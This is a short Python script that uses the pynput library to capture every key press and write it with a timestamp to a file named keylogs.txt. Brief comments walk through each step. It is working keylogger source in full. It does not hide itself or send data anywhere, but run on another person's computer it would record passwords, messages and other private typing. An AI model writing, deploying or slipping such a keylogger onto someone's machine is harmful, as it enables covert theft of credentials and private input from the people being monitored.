from pynput import keyboard
import logging

# Specify the directory where you want to save the logs

log_dir = ""

# Set up logging configuration

logging.basicConfig(filename=log_dir + "keylogs.txt",
        level=logging.DEBUG,
            format='%(asctime)s: %(message)s')

# Define the on_press function to log the key presses

def on_press(key):
    logging.info(str(key))

# Set up the listener for key presses

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
